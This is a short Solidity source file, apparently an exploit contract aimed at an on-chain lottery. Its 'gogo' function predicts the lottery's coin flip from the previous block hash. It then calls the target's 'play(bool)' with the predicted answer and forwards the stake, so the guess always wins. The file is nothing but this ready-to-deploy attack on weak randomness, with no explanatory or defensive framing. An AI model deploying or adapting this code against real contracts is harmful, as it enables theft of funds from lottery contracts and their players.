pragma solidity ^0.4.21;





contract caller {
    address _addr;
    
    function _set (address addr) public{
        _addr = addr;
    }
    
    function _callLottery (bool _theAns) public { 
        _addr.call.value(msg.value)(bytes4(sha3("play(bool)")),_theAns);
    }
    
    
    
}

contract Lottery is caller {
    
    function gogo() public payable  {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        if (coinFlip == 1) {
            _callLottery(true);
        }
        else{
            _callLottery(false);
        }
    }
    
}
